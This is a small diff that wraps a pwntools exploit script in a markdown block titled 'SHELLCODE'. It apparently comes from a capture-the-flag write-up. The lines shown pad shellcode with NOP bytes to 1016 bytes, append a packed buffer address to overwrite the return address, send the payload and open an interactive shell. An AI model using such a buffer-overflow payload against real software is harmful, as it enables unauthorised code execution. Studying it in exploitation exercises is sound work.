@@ -1,3 +1,7 @@
+# SHELLCODE
+
+```python
+
 #!/usr/bin/python
 from pwn import *
 
@@ -54,3 +58,4 @@ payload = shellcode.ljust(1016, b"\x90") + p64(buffer)
 r.send(payload)
 
 r.interactive()
+```
